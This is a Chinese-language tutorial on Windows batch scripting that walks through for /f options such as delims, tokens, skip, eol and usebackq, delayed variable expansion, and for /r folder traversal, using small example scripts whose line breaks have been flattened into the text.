这段代码，主要是让你树立这样一种观念：读取文本文件的内容（注：改为“逐行分析文本文件的内容”，因为读取文本文件内容的方法命令有很多，比如重定向输入，又比如type/more/find/sort等命令），请使用 for /f 语句！ 进阶话题：for /f 语句是把整个test.txt一次性显示出来的？ 在这段代码中，虽然执行结果是把test.txt中的所有内容都显示出来了，貌似 for /f 语句是把整个test.txt一次性显示到屏幕上，实际上并非如此。 无论for语句做何种变化，它的执行过程仍然遵循基本的for流程：依次处理每个元素，直到所有的元素都被处理为止。只不过在for /f语句中，这里的元素是指文件中的每一行，也就是说，for /f 语句是以行为单位处理文本文件的。这是一条极为重要的规则，在上一章中也强调过它的重要性，希望在接下来的学习过程中，你能时刻牢记这一原则，那么，很多问题将会迎刃而解。以下是验证这一说法的演示代码（在[code4]的基础上添加了&amp;pause语句）：[code5] 123@echo offfor /f %%i in (test.txt) do echo %%i&amp;pausepause 切分字符串的利器：delims=也许你对[code4]这段代码不屑一顾：不就是把test.txt的内容显示出来了么？好像用处不大啊。 好吧，我们来玩个魔术。 还是[txt1]这段文本，把[code4]改造一下：[code6] 123@echo offfor /f "delims=，" %%i in (test.txt) do echo %%ipause 再次运行test.cmd，看到什么变化了吗？[result2] 1234论坛的目标是：不求最大论坛地址：bbs.bathome.net。这里是：新手晋级的福地请按任意键继续... 结果，你惊奇地发现，每行第一个逗号之后的所有内容都不见了（如果有不存在逗号的行，则保留原样），也就说，你成功地提取到了每行第一个逗号之前的所有内容！ 试想一下，这段代码会有什么用呢？ 如果别人给了你一个软件清单，每行都是”英文软件名（逗号）中文软件名”的格式，而你却只想保留英文名的时候，这段代码将是多么有用啊！再假设，有这么一个IP文件，第一列是数字格式的IP地址，第二列是具体的空间地址，列与列之间用逗号分隔，而你想提取其中数字格式的IP，呵呵，我不说你也知道该怎么办了吧？ 要是文本内容不是以逗号分隔，而是以其他符号分隔，那么，把”delims=,”的逗号换成相应的符号就可以了。 在这里，我们引入了一个新的开关：”delims=，”，它的含义是：以逗号作为被处理的字符串的分隔符号。 在批处理中，指定分隔符号的方法是：添加一个形如 “delims=符号列表” 的开关，这样，被处理的每行字符串都会被符号列表中罗列出来的符号切分开来。 需要注意的是：如果没有指定”delims=符号列表”这个开关，那么，for /f 语句默认以空格键或跳格键作为分隔符号。请把[txt1]中不同位置上的标点符号改为空格或跳格，再运行[code4]试试。 进阶话题：如果我要指定的符号不止一个，该怎么办？ 在上面的讲解中，我提到了指定分隔符号的方法：添加一个形如”delims=符号列表”的开关。不知道你注意到没有，我的说法是”符号列表”而非”符号”，这是大有讲究的，因为，你可以一次性指定多个分隔符号！ 还是以[txt1]为例，把[code6]再改造一下[code7] 123@echo offfor /f "delims=.，" %%i in (test.txt) do echo %%ipause 结果显示：[result3] 1234论坛的目标是：不求最大论坛地址：bbs这里是：新手晋级的福地请按任意键继续... 这样，第一个点号或第一个逗号之前的内容都被提取出来了。 [code7]的执行过程是：逐行读取test.txt中的内容，以点号和逗号切分每一行的内容（不存在点号和逗号的行，则不再切分，为了描述的方便，我们把被点号或逗号切分的一个一个的字符串片段，称之为节），然后，for /f 会提取第一节的内容作为最终结果，显示在屏幕上。需要注意的是，在这里，所有行的字符串被切分成了两个以上的节，但是，[code7]的代码只会提取第一节字符串的内容，因为 for /f 语句默认只提取第一节的符串。 定点提取：tokens=上一节在讲解 delims= 的时候，我一再强调 for /f 默认只能提取到第一节的内容，现在我们来思考一个问题：如果我要提取的内容不在第一节上，那怎么办？ 这回，就该轮到 tokens= 出马了。 tokens= 后面一般跟的是数字，如 tokens=2，也可以跟多个，但是每个数字之间用逗号分隔，如 tokens=3,5,8，它们的含义分别是：提取第2节字符串、提取第3、第5和第8节字符串。注意，这里所说的“节”，是由 delims= 这一开关划分的，它的内容并不是一成不变的。 下面来看一个例子：[txt2] 1尺有所短，寸有所长，学好批处理没商量，考虑问题复杂化，解决问题简洁化。 对[txt2]这段文本，假设它们保存在文件test.txt中，如果我想提取“学好批处理没商量”这句话，该如何写代码呢？ 我们稍微观察一下[txt2]就会发现，如果以逗号作为切分符号，就正好可以把“学好批处理没商量”化为单独的一“节”，结合上一节的讲解，我们知道，”delims=，” 这个开关是不可缺少的，而要提取的内容在以逗号切分的第3节上，那么，tokens= 后面的数字就应该是3了，最终的代码如下：[code8] 123@echo offfor /f "delims=， tokens=3" %%i in (test.txt) do echo %%ipause 如果我们现在要提取的不只一个“节”，而是多个，那又怎么办呢？比如，要提取以逗号切分的第2节和第5节字符串，是写成这样吗？[code9] 123@echo offfor /f "delims=， tokens=2,5" %%i in (test.txt) do echo %%ipause 运行批处理后发现，执行结果只显示了第2节的内容。 原来，echo 后面的 %%i 只接收到了 tokens=2,5 中第一个数值2所代表的那个字符串，而第二个数值5所代表的字符串因为没有变量来接收，所以就无法在执行结果中显示出来了。 那么，要如何接收 tokens= 后面多个数值所指代的内容呢？ for /f 语句对这种情况做如下规定： 如果 tokens= 后面指定了多个数字，如果形式变量为%%i，那么，第一个数字指代的内容用第一个形式变量%%i来接收，第二个数字指代的内容用第二个形式变量%%j来接收，第三个数字指代的内容用第三个形式变量%%k来接收……第N个数字指代的内容用第N个形式变量来接收，其中，形式变量遵循字母的排序，第N个形式变量具体是什么符号，由第一个形式变量来决定：如果第一个形式变量是%%i，那么，第二个形式变量就是%%j；如果第一个形式变量用的是%%x，那么，第二个 形式变量就是%%y。 现在回头去看[code9]，你应该知道如何修改才能满足题目的要求了吧？修改结果如下：[code10] 123@echo offfor /f "delims=， tokens=2,5" %%i in (test.txt) do echo %%i %%jpause 如果有这样一个要求：显示[txt2]中的内容，但是逗号要替换成空格，如何编写代码？ 结合上面所学的内容，稍加思索，你可能很快就得出了答案：[code11] 123@echo offfor /f "delims=， tokens=1,2,3,4,5" %%i in (test.txt) do echo %%i %%j %%k %%l %%mpause 写完之后，你可能意识到这样一个问题：假如要提取的“节”数不是5，而是10，或者20，或者更多，难道我也得从1写到10、20或者更多吗？有没有更简洁的写法呢？ 答案是有的，那就是：如果要提取的内容是连续的多“节”的话，那么，连续的数字可以只写最小值和最大值，中间用短横连接起来即可，比如 tokens=1,2,3,4,5 可以简写为 tokens=1-5 。 还可以把这个表达式写得更复杂一点：tokens=1,2-5，tokens=1-3,4,5，tokens=1-4,5……怎么方便就怎么写吧。 大家可能还看到一种比较怪异的写法：[code12] 123@echo offfor /f "delims=， tokens=1,*" %%i in (test.txt) do echo %%i %%jpause 结果，第一个逗号不见了，取代它的是一个空格符号，其余部分保持不变。 其中奥妙就在这个星号上面。 tokens=后面所接的星号具备这样的功能：字符串从左往右被切分成紧跟在之前的数值所表示的节数之后，字符串的其余部分保持不变，整体被所表示的一个变量接收。 理论讲解是比较枯燥的，特别是为了严密起见，还使用了很多限定性的修饰词，导致句子很长，增加了理解的难度，我们还是结合[code12]来讲解一下吧。 [txt2] 的内容被切分，切分符号为逗号，当切分完第一节之后，切分动作不再继续下去，因为 tokens=1,* 中，星号前面紧跟的是数字1；第一节字符串被切分完之后，其余部分字符串不做任何切分，整体作为第二节字符串，这样，[txt2]就被切分成了两节，分别 被变量%%i和变量%%j接收。 以上几种切分方式可以结合在一起使用。不知道下面这段代码的含义你是否看得懂，如果看不懂的话，那就运行一下代码，然后反复揣摩，你一定会更加深刻地理解本节所讲解的内容的：[code13] 123@echo offfor /f "delims=， tokens=1,3-4,*" %%i in (test.txt) do echo %%i %%j %%k %%lpause ** 跳过无关内容，直奔主题：skip=n**很多时候，有用的信息并不是贯穿文本内容的始终，而是位于第N行之后的行内，为了提高文本处理的效率，或者不受多余信息的干扰，for /f 允许你跳过这些无用的行，直接从第N+1行开始处理，这个时候，就需要使用参数 skip=n，其中，n是一个正整数，表示要跳过的行数。例如：[code14] 123@echo offfor /f "skip=2" %%i in (test.txt) do echo %%ipause 这段代码将跳过头两行内容，从第3行起显示test.txt中的信息。 忽略以指定字符打头的行：eol= 在cmd窗口中敲入：for /?，相关的解释为： 123eol=c -指一个行注释字符的结尾(就一个)FOR /F "eol=; tokens=2,3* delims=, " %i in (myfile.txt) do @echo %i %j %k会分析 myfile.txt 中的每一行，忽略以分号打头的那些行…… 第一条解释狗屁不通，颇为费解：行注释字符的结尾是什么意思？“(就一个)”怎么回事？结合第二条解释，才知道eol有忽略指定行的功能。但是，这两条解释是互相矛盾的：到底是忽略以指定字符打头的行，还是忽略以指定字符结尾的行？ 实践是检验真理的唯一标准，还是用代码来检验一下eol的作用吧：[code15] 123@echo offfor /f "eol=;" %%i in (test.txt) do echo %%ipause 结果，那些以分号打头的行没有显示出来。 由此可见，第二条解释是正确的，eol= 的准确含义是：忽略以指定字符打头的行。而第一条的“结尾”纯属微软在信口开河。 那么，“(就一个)”又作何解释呢？ 试试这个代码：[code16] 123@echo offfor /f "eol=,;" %%i in (test.txt) do echo %%ipause 此时，屏幕上出现“此时不应有” ;”。”的报错信息。可见，在指定字符的时候，只能指定1个——在很多时候，我对这样的设计颇有微词而又无可奈何：为什么只能指定1个而不是多个？要忽略多个还得又是if又是findstr加管道来多次过滤，那效率实在太低下了——能用到的功能基本上都提供，但是却又做不到更好，批处理，你的功能为什么那么弱？ 不知道大家注意到没有，如果test.txt中有以分号打头的行，那么，这些行在代码[code14]的执行结果中将凭空消失。 原来，for /f 语句是默认忽略以分号打头的行内容的，正如它默认以空格键或跳格键作为字符串的切分字符一样。（注：eol=;这种默认设置，在delims=;时变得无效。） 很多时候，我们可以充分利用这个特点，比如，在设计即将用for读取的配置文件的时候，可以在注释文字的行首加上分号，例如在编写病毒文件查杀代码的时候，可以通过for语句来读取病毒文件列表，那么，病毒文件列表.ini这个配置文件可以这样写： 12345;以下是常见的病毒文件，请见一个杀一个;copyleft:没有qq.exemsn.exeiexplore.exe 如果要取消这个默认设置，可选择的办法是： 1、为eol=指定另外一个字符； 2、使用 for /f “eol=” 语句，也就是说，强制指定字符为空，就像对付delims=一样。 如何决定该使用 for /f 的哪种句式？（兼谈usebackq的使用）for /f %%i in (……) do (……) 语句有好几种变形语句，不同之处在于第一个括号里的内容：有的是用单引号括起来，有的是用双引号包住，有的不用任何符号包裹，具体格式为： 1231、for /f %%i in (文件名) do (……)2、for /f %%i in (&apos;命令语句&apos;) do (……)3、for /f %%i in (&quot;字符串&quot;) do (……) 看到这里，我想很多人可能已经开始犯了迷糊了：如果要解决一个具体问题，面对这么多的选择，如何决定该使用哪一条呢？ 实际上，当我在上面罗列这些语句的时候，已经有所提示了，不知道你是否注意到了。 如果你一时无法参透其中奥妙，那也无妨，请听我一一道来便是。 ​ 1、当你希望读取文本文件中的内容的话，第一个括号中不用任何符号包裹，应该使用的是第1条语句；例如：你想显示test.txt中的内容，那么，就使用 for /f %%i in (test.txt) do echo %%i； 2、当你读取的是命令语句执行结果中的内容的话，第一个括号中的命令语句必须使用单引号包裹，应该使用的是第2条语句；例如：你想显示当前目录下文件名中含有test字符串的文本文件的时候，应该使用 for /f %%i in (‘dir /a-d /b test.txt’) do echo %%i 这样的语句； 3、当你要处理的是一个字符串的时候，第一个括号中的内容必须用双引号括起来，应该是用的是第3条语句；例如：当你想把bbs.bathome.net这串字符中的点号换为短横线并显示出来的话，可以使用 for /f “delims=. tokens=1-3” %%i in (“bbs.bathome.net”) do echo %%i-%%j-%%k 这样的语句。 很显然，第一个括号里是否需要用符号包裹起来，以及使用什么样的符号包裹，取决于要处理的对象属于什么类型：如果是文件，则无需包裹；如果是命令语句，则用单引号包裹；如果是字符串，则使用双引号括起来。 当然，事情并不是绝对如此，如果细心的你想到了批处理中难缠的特殊字符，你肯定会头大如斗。 或许你头脑中灵光一闪，已经想到了一个十分头痛的问题：在第1条语句中，如果文件名中含有空格或&amp;，该怎么办？ 照旧吗？ 拿个叫 test 1.txt 的文件来试试。 你很快写好了代码，新建文件–&gt;码字–&gt;保存为批处理，前后费时不到1分钟：[code17] 123@echo offfor /f %%i in (test 1.txt) do echo %%ipause 你兴冲冲地双击批处理，运行后，屏幕上出现了可耻的报错信息：系统找不到文件 test 。 当你把 test 1.txt 换成 test&amp;1.txt 后，更怪异的事情发生了：CMD窗口在你眼前一闪而过，然后，优雅地消失了。 你可能觉得自己的代码写错了某些符号，你再仔细的检查了一次，确认没有笔误，然后，你再次双击批处理，结果问题照旧；你开始怀疑其他程序对它可能有影响，于是关掉其他窗口，再运行了一次，问题依旧；你不服气地连续运行了好几次，还是同样的结果。 怪哉！ 你一拍大腿，猛然想起了一件事：当路径中含有特殊字符的时候，应该使用引号把路径括起来。对，就是它了！ 但是，当你把代码写出来之后，你很快就焉了：for /f %%i in (“test 1.txt”) do echo %%i，这不就是上面提到的第3条 for /f 命令的格式吗？批处理会把 test 1.txt 这个文件名识别为字符串啊！ 你百无聊赖地在CMD窗口中输入 for /? ，并重重地敲下了回车，漫无目的地在帮助信息中寻找，希望能找到点什么。 结果还真让你到了点什么。 你看到了这样的描述： 12usebackq - 指定新语法已在下类情况中使用: 在作为命令执行一个后引号的字符串并且一个单引号字符为文字字符串命令并允许在 filenameset 中使用双引号扩起文件名称。 但是，通读一遍之后，你却如坠五里雾中，不知所云。 还好，下面有个例子，并配有简单的说明： 12FOR /F &quot;usebackq delims==&quot; %i IN (`set`) DO @echo %i会枚举当前环境中的环境变量名称。 你仔细对比了for /f语句使用usebackq和不使用usebackq时在写法上的差别，很快就找到了答案：当使用了usebackq之后，如果第一个括号中是一条命令语句，那么，就要把单引号’改成后引号`（键盘左上角esc键下面的那个按键，与~在同一键位上）。 回过头去再看那段关于usebackq的描述，字斟句酌，反复揣摩，终于被你破译了天机：usebackq 是一个增强型参数，当使用了这个参数之后，原来的for语句中第一个括号内的写法要做如下变动：如果第一个括号里的对象是一条命令语句的话，原来的单引号’要改为后引号`；如果第一个括号里的对象是字符串的话，原来的双引号”要改为单引号’；如果第一个括号里的对象是文件名的话，要用双引号”括起来。 验证一下，把[code17]改写成如下代码：[code18] 123@echo offfor /f "usebackq" %%i in ("test 1.txt") do echo %%ipause 测试通过！ 此时，你很可能会仰天长叹：Shit，微软这该死的机器翻译！ 至于把[code17]代码中的空格换成&amp;后，CMD窗口会直接退出，那是因为&amp;是复合语句的连接符，CMD在预处理的时候，会优先把&amp;前后两部分作为两条语句来解析，而不是大家想象中的一条完整的for语句，从而产生了严重的语法错误。因为牵涉到预处理机制问题，不属于本节要讨论的内容，在此不做详细讲解。 这个时候，我们会吃惊地发现，区区一条for语句，竟然有多达6种句型： 1234561、for /f %%i in (文件名) do (……)2、for /f %%i in (&apos;命令语句&apos;) do (……)3、for /f %%i in (&quot;字符串&quot;) do (……)4、for /f &quot;usebackq&quot; %%i in (&quot;文件名&quot;) do (……)5、for /f &quot;usebackq&quot; %%i in (`命令语句`) do (……)6、for /f &quot;usebackq&quot; %%i in (&apos;字符串&apos;) do (……) 其中，4、5、6由1、2、3发展而来，他们有这样的对应关系：1–&gt;4、2–&gt;5、3–&gt;6。 好在后3种情形并不常用，所以，牢牢掌握好前三种句型的适用情形就可以了，否则，要在这么多句型中确定选择哪一条语句来使用，还真有点让人头脑发懵。 至于 for /f 为什么要增加usebacq参数，我只为第4条语句找到了合理的解释：为了兼容文件名中所带的空格或&amp;。它在第5、6条语句中为什么还有存在的必要，我也不是很明白，这有待于各位去慢慢发现。（注：这种解释虽然有点不靠谱，但也算一种解释，大家将就看看吧。启用usebackq选项的时候，“文件名”取代了“字符串”，那么“字符串”只好改变为“命令语句”，“命令语句”只好用后引号重新表示——简而言之，是“文件名”符号改变引起的蝴蝶效应。言外之意：usebackq除了在处理带空格的文件名时会用到外，根本就没有其它的出场机会和存在价值。） 变量延迟详解变量延迟在for语句中起着至关重要的作用，不只是在for语句中，在其他的复合语句中，它也在幕后默默地工作着，为了突出它的重要性，本节内容在单独的楼层中发出来，希望引起大家的重视。 对于批处理新手而言，“变量延迟”这个概念很可能闻所未闻，但是，它却像一堵横亘在你前进道路上的无形高墙，你感受不到它的存在，但当你试图往前冲时，它会把你狠狠地弹回来，让你无法逾越、无功而返；而一旦找到了越过它的方法，你就会发现，在for的世界里，前面已经是一片坦途，而你对批处理的理解，又上升到了一个新的境界。 例如，你编写了这样一个代码：[code19] 123@echo offset num=0&amp;&amp;echo %num%pause 你的本意是想对变量num赋值之后，再把这个值显示出来，结果，显示出来的并不是0，而是显示：ECHO 处于关闭状态。 之所以会出错，是因为“变量延迟”这个家伙在作怪。 在讲解变量延迟之前，我们需要了解一下批处理的执行过程，它将有助于我们深入理解变量延迟。 批处理的执行过程是怎样的呢？ “自上而下，逐条执行”，我想，这个经典的说法大家都已经耳熟能详了，没事的时候倒着念，也还别有一番古韵呢，但是，我想问大家的是，大家真的深刻地理解了这句话的含义了吗？ “自上而下”，这一条和我们本节的讲解关系不大，暂时略过不说，后一条，“逐条执行”和变量延迟有着莫大的干系，它是我们本节要关注的重点。 很多人往往认为一行代码就是一条语句，从而把“逐条执行”与“逐行执行”等同起来，这就大错特错了。 莫非“逐条执行”里暗藏着玄机？ 正是如此。 “逐条”并不等同于“逐行”。这个“条”，是“一条完整的语句”的意思，并不是指“一行代码”。在批处理中，是不是一条完整的语句，并不是以行来论的，而是要看它的作用范围。 什么样的语句才算“一条完整的语句”呢？ 1、在复合语句中，整个复合语句是一条完整的语句，而无论这个复合语句占用了多少行的位置。常见的复合语句有：for语句、if……else语句、用 连接符&amp;、||和&amp;&amp;连接的语句，用管道符号|连接的语句，以及用括号括起来的、由多条语句组合而成的语句块； 2、在非复合语句中，如果该语句占据了一行的位置，则该行代码为一条完整的语句。例如：[code20] 1234567891011121314 1 @echo off 2 set num=0 3 for /f %%i in ('dir /a-d /b *.exe') do ( 4 set /a num+=1 5 echo num 当前的值是 %num% 6 ) 7 echo 当前目录下共有 %num% 个exe文件 8 dir /a-d /b *.txt|findstr "test"&gt;nul&amp;&amp;( 9 echo 存在含有 test 字符串的文本本件10 ) || echo 不存在含有 test 字符串的文本文件11 if exist test.ini (12 echo 存在 test.ini 文件13 ) else echo 不存在 test.ini 文件14 pause 上面的代码共有14行，但是只有完整的语句只有7条，它们分别是： 第1条：第1行的echo语句； 第2条：第2行的set语句； 第3条：第3、4、5、6行上的for复合语句； 第4条：第7行的echo语句； 第5条：第8、9、10行上用&amp;&amp;和||连接的复合语句； 第6条：第11、12、13行上的if……else复合语句； 第7条：第14行上的pause语句。 在这里，我之所以要花这么长的篇幅来说明一行代码并不见得就是一条语句，是因为批处理的执行特点是“逐条”执行而不是“逐行”执行，澄清了这个误解，将会更加理解批处理的预处理机制。 在代码“逐条”执行的过程中，cmd.exe这个批处理解释器会对每条语句做一些预处理工作，这就是批处理中大名鼎鼎的“预处理机制”。 预处理的大致情形是这样的：首先，把一条完整的语句读入内存中（不管这条语句有多少行，它们都会被一起读入），然后，识别出哪些部分是命令关键字，哪些是开关、哪些是参数，哪些是变量引用……如果代码语法有误，则给出错误提示或退出批处理环境；如果顺利通过，接下来，就把该条语句中所有被引用的变量及变量两边的百分号对，用这条语句被读入内存之就已经赋予该变量的具体值来替换……当所有的预处理工作完成之后，批处理才会执行每条完整语句内部每个命令的原有功能。也就是说，如果命令语句中含有变量引用（变量及紧邻它左右的百分号对），并且某个变量的值在命令的执行过程中被改变了，即使该条语句内部的其他地方也用到了这个变量，也不会用最新的值去替换它们，因为某条语句在被预处理的时候，所有的变量引用都已经被替换成字符串常量了，变量值在复合语句内部被改变，不会影响到语句内部的其他任何地方。 顺便说一下，运行代码[code20]之后，将在屏幕上显示当前目录下有多少个exe文件，是否存在含有 test 字符串的文本文件，以及是否存在 test.ini 这个文件等信息。让很多人百思不得其解的是：如果当前目录下存在exe文件，那么，有多少个exe文件，屏幕上就会提示多少次 “num 当前的值是 0” ，而不是显示1到N（N是exe文件的个数）。 结合上面两个例子，我们再来分析一下，为什么这两段代码的执行结果和我们的期望有一些差距。 在[code19]中，set num=0&amp;&amp;echo %num%是一条复合语句，它的含义是：把0赋予变量num，成功后，显示变量num的值。 虽然是在变量num被赋值成功后才显示变量num的值，但是，因为这是一条复合语句，在预处理的时候，&amp;&amp;后的%num%只能被set语句之前的语句赋予变量num的具体值来替换，而不能被复合语句内部、&amp;&amp;之前的set语句对num所赋予的值来替换，可见，此num非彼num。可是，在这条复合语句之前，我们并没有对变量num赋值，所以，&amp;&amp;之后的%num%是空值，相当于在&amp;&amp;之后只执行了 echo 这一命令，所以，会显示 echo 命令的当前状态，而不是显示变量num的值（虽然该变量的值被set语句改变了）。 在[code20]中，for语句的含义是：列举当前目录下的exe文件，每发现一个exe文件，变量num的值就累加1，并显示变量num的值。 看了对[code19]的分析之后，再来分析[code20]就不再那么困难了：第3、4、5行上的代码共同构成了一条完整的for语句，而语句”echo num 当前的值是 %num%”与”set /a num+=1”同处复合语句for的内部，那么，第4行上set改变了num的值之后，并不能对第5行上的变量num有任何影响，因为在预处理阶段，第5行上的变量引用%num%已经被在for之前就赋予变量num的具体值替换掉了，它被替换成了0（是被第2行上的set语句赋予的）。 如果想让代码[code19]的执行结果中显示&amp;&amp;之前赋予num的值，让代码[code20]在列举exe文件的时候，从1到N地显示exe文件的数量，那又该怎么办呢？ 对代码[code19]，可以把用&amp;&amp;连接复合语句拆分为两条单独的语句，写成： 1234@echo offset num=0echo %num%pause 但是，这不是我们这次想要的结果。 对这两段代码都适用的办法是：使用变量延迟扩展语句，让变量的扩展行为延迟一下，从而获取我们想要的值。 在这里，我们先来充下电，看看“变量扩展”有是怎么一回事。 用CN-DOS里批处理达人willsort的原话，那就是：“在许多可见的官方文档中，均将使用一对百分号闭合环境变量以完成对其值的替换行为称之为“扩展（expansion）”，这其实是一个第一方的概念，是从命令解释器的角度进行称谓的，而从我们使用者的角度来看，则可以将它看作是引用（Reference）、调用（Call）或者获取（Get）。”（见：什么情况下该使用变量延迟？http://www.cn-dos.net/forum/viewthread.php?tid=20733）说得直白一点，所谓的“变量扩展”，实际上就是很简单的这么一件事情：用具体的值去替换被引用的变量及紧贴在它左右的那对百分号。 既然只要延迟变量的扩展行为，就可以获得我们想要的结果，那么，具体的做法又是怎样的呢？ 一般说来，延迟变量的扩展行为，可以有如下选择： 1、在适当位置使用 setlocal enabledelayedexpansion 语句； 2、在适当的位置使用 call 语句。 使用 setlocal enabledelayedexpansion 语句，那么，[code19]和[code20]可以分别修改为： 1234@echo offsetlocal enabledelayedexpansionset num=0&amp;&amp;echo !num!pause 123456789101112131415@echo offset num=0setlocal enabledelayedexpansionfor /f %%i in ('dir /a-d /b *.exe') do ( set /a num+=1 echo num 当前的值是 !num!)echo 当前目录下共有 %num% 个exe文件dir /a-d /b *.txt|findstr "test"&gt;nul&amp;&amp;( echo 存在含有 test 字符串的文本本件)||echo 不存在含有 test 字符串的文本文件if exist test.ini ( echo 存在 test.ini 文件) else echo 不存在 test.ini 文件pause 使用第call语句，那么，[code19]和[code20]可以分别修改为： 123@echo offset num=0&amp;&amp;call echo %%num%%pause 1234567891011121314@echo offset num=0for /f %%i in ('dir /a-d /b *.exe') do ( set /a num+=1 call echo num 当前的值是 %%num%%)echo 当前目录下共有 %num% 个exe文件dir /a-d /b *.txt|findstr "test"&gt;nul&amp;&amp;( echo 存在含有 test 字符串的文本本件)||echo 不存在含有 test 字符串的文本文件if exist test.ini ( echo 存在 test.ini 文件) else 不存在 test.ini 文件pause 由此可见，如果使用 setlocal enabledelayedexpansion 语句来延迟变量，就要把原本使用百分号对闭合的变量引用改为使用感叹号对来闭合；如果使用call语句，就要在原来命令的前部加上 call 命令，并把变量引用的单层百分号对改为双层。 其中，因为call语句使用的是双层百分号对，容易使人犯迷糊，所以用得较少，常用的是使用 setlocal enabledelayedexpansion 语句（set是设置的意思，local是本地的意思，enable是能够的意思，delayed是延迟的意思，expansion是扩展的意思，合起来， 就是：让变量成为局部变量，并延迟它的扩展行为）。 通过上面的分析，我们可以知道： 1、为什么要使用变量延迟？因为要让复合语句内部的变量实时感知到变量值的变化。 2、在哪些场合需要使用变量延迟语句？在复合语句内部，如果某个变量的值发生了改变，并且改变后的值需要在复合语句内部的其他地方被用到，那么，就需要使用变量延迟语句。而复合语句有：for语句、if……else语句、用连接符&amp;、||和&amp;&amp;连接的语句、用管道符号|连接的语句，以及用括号括起来的、由多条语句组合而成的语句块。最常见的场合，则是for语句和if……else语句。 3、怎样使用变量延迟？ 方法有两种： ① 使用 setlocal enabledelayedexpansion 语句：在获取变化的变量值语句之前使用setlocal enabledelayedexpansion，并把原本使用百分号对闭合的变量引用改为使用感叹号对来闭合； ② 使用 call 语句：在原来命令的前部加上 call 命令，并把变量引用的单层百分号对改为双层。 “变量延迟”是批处理中一个十分重要的机制，它因预处理机制而生，用于复合语句，特别是大量使用于强大的for语句中。只有熟练地使用这一机制，才能在for的世界中如鱼得水，让自己的批处理水平更上一层楼。很多时候，对for的处理机制，我们一直是雾里看花，即使偶有所得，也只是只可意会难以言传。希望大家反复揣摩，多加练习，很多细节上的经验，是只有通过大量的摸索才能得到的。 本节内容在原理上参考了这篇文章：什么情况下该使用变量延迟？http://www.cn-dos.net/forum/viewthread.php?tid=20733，在本论坛中的地址是：http://bbs.bathome.net/viewthread.php?tid=2899 翻箱倒柜遍历文件夹：for /rfor /r 的作用及用法按照帮助信息里文绉绉的说法，for /r 的作用是“递归”，我们换一个通俗一点的，叫“遍历文件夹”。 更详细的解释就是：在下面的语句中，如果“元素集合”中只是一个点号，那么，这条语句的作用就是：列举“目录”及其之下的所有子目录，对这些文件夹都 执行“命令语句集合”中的命令语句。其作用与嵌套进 for /f 复合语句的 “dir /ad /b /s 路径” 功能类似。如果省略了“目录”，将在当前目录下执行前面描述的操作。 1for /r 目录 %%i in (元素集合) do 命令语句集合 先来个代码增强一下印象：[code21] 123@echo offfor /r d:\test %%i in (.) do echo %%ipause 执行的结果如下所示： 1234d:\test\.d:\test\1\.d:\test\2\.d:\test\3\. 效果就是显示 d:\test 目录及其之下是所有子目录的路径，其效果与 dir /ad /b /s d:\test 类似。若要说到两者的区别，可以归纳出3点： 1、for /r 列举出来的路径最后都带有斜杠和点号，而 dir 语句则没有，会对获取到的路径进行进一步加工产生影响； 2、for /r 不能列举带隐藏属性的目录，而 dir 语句则可以通过指定 /a 后面紧跟的参数来获取带指定属性的目录，更加灵活； 3、若要对获取到的路径进行进一步处理，则需要把 dir 语句放入 for /f 语句中进行分析，写成 for /f %%i in (‘dir /ad /b /s’) do …… 的形式；由于 for /r 语句是边列举路径边进行处理，所以，在处理大量路径的时候，前期不会感到有停顿，而 for /f 语句则需要等到 dir /ad /b /s 语句把所有路径都列举完之后，再读入内存进行处理，所以，在处理大量路径的时候，前期会感到有明显的停顿。 第2点差别很容易被大家忽视，导致用 for /r 列举路径的时候会造成遗漏；而第3点则会让大家有更直观的感受，很容易感觉到两者之间的差别。 要是“元素集合”不是点号呢？那又如何？ 来看看这个代码：[code22] 123@echo offfor /r d:\test %%i in (a b c) do echo %%ipause 运行的结果是： 123456789D:\test\1\aD:\test\1\bD:\test\1\cD:\test\2\aD:\test\2\bD:\test\2\cD:\test\3\aD:\test\3\bD:\test\3\c 原来，它的含义是：列举 d:\test 及其所有的子目录，对所有的目录路径都分别添加a、b、c之后再显示出来。 再来看一个代码：[code23] 123@echo offfor /r d:\test %%i in (*.txt) do echo %%ipause 运行结果是： 123456D:\test\test.txtD:\test\1\1.txtD:\test\1\2.txtD:\test\2\a.txtD:\test\2\b.txtD:\test\3\1.txt 这段代码的含义是：列举 d:\test 及其所有子目录下的txt文本文件（以.txt结尾的文件夹不会被列出来）。 我们再回过头来归纳一下这个语句的作用： 1for /r 目录 %%i in (元素集合) do 命令语句集合 上面语句的作用是： 1、列举“目录”及该目录路径下所有子目录，并把列举出来的目录路径和元素集合中的每一个元素拼接成形如“目录路径\元素”格式的新字符串，然后，对每一条这样的新字符串执行“命令语句集合”中的每一条命令； 特别的是：当“元素集合”带以点号分隔的通配符?或*的时候，把“元素集合”视为文件（不视为文件夹），整条语句的作用是匹配“目录”所指文件夹及其所有子文件夹下匹配的文件；若不以点号分隔，则把“元素集合”视为文件夹（不视为文件）； 2、当省略掉“目录”时，则针对当前目录； 3、当元素集合中仅仅是一个点号的时候，将只列举目录路径； for /r 还是 dir /ad /b /s？列举目录时该如何选择前面已经说过，当列举目录时，for /r 和 dir /ad /b /s 的效果是非常类似的，这就产生了一个问题：当我要获取目录路径并进行进一步处理的时候，两者之间，我该如何选择？ 这个问题，前面其实已经有过一些讨论，现在我们再来作详细的分析。 我们来看一下两者各自的优缺点： 1、for /r： 1）优点： ​ ① 只通过1条语句就可以同时实现获取目录路径和处理目录路径的操作； ② 遍历文件夹的时候，是边列举边处理的，获取到一条路径就处理一条路径，内存占用小，处理大量路径的时候不会产生停顿感； 2）缺点： ​ ① 不能获取到带隐藏属性的目录，会产生遗漏； ② 不能获取带指定属性的目录 2、dir /ad /s： 1）优点： ​ ① 能一次性获取带任意属性的目录，不会产生遗漏； ② 能通过指定不同的参数获取带任意属性的目录，更具灵活性。 2）缺点： ​ ① dir /ad /s 语句仅能获取到目录路径，若要实现进一步的处理，还需要嵌入 for /f 语句中才能实现，写法不够简洁； ② 嵌入 for /f 语句之后，需要写成 for /f “delims=” %%i in (‘dir /ad /b /s’) do …… 的格式，受 for /f 语句运行机制的制约，需要先列举完所有的路径放入内存之后，才能对每一条路径进行进一步的处理，处理大量路径时，内存占用量偏大，并且在前期会产生明显的 停顿感，用户体验度不够好； 综合上述分析，可以做出如下选择： 1、若仅仅是为了获取某文件夹及其所有子文件夹的路径的话，请选择 dir /ad /b /s 语句； 2、若需要过滤带隐藏属性的文件夹的话，for /r 和 dir 语句都可以实现，但 for /r 内存占用小，处理速度快，是上上之选； 3、若需要获取所有文件夹，则除了 dir /ad /b /s 外，别无选择，因为 for /r 语句会遗漏带隐藏属性的文件夹； 